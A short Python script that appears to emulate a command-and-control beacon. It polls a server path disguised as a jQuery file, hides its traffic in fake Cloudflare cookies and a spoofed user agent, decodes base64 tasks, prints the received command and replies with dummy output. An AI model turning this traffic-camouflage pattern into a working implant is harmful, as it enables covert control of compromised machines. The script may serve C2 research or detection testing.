#!/usr/bin/env python3

import sys
import json
import requests
from base64 import b64encode, b64decode

addr = sys.argv[1]
path = '/assets/jquery-3.6.0.slim.min.js'
cflb = '49f062b5-8b94-4fff-bb41-d504b148aa1b'
ua   = 'Mozilla/5.0 (Windows NT 10.0; Win64; x64; Xbox; Xbox One) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36 Edge/44.18363.1337'

while True:
    try:

        # first get commands
        cookie = f'__cflb={cflb}'
        r = requests.get(f'http://{addr}/{path}', headers={'Cookie': cookie, 'User-Agent': ua})
        data = r.text
        
        if data[-1] == ';':
            data = data[:-1]
        task = data[data.rindex(';')+1:]
        task = task[len("task=\""):-1]
        if task:
            task = json.loads(b64decode(task))
            
            if 'cmd' in task:
                print(b64decode(task['cmd'].encode('utf-8')))

            data = {
                'id': task['id'],
                'output': 'lol',
            }
        else:
            data = {}

        # then respond
        cookie = f'__cflb={cflb}; __cfuid={b64encode(json.dumps(data).encode("utf-8")).decode()}'
        r = requests.post(f'http://{addr}/{path}', headers={'Cookie': cookie, 'User-Agent':ua})
    except KeyboardInterrupt:
        quit(0)
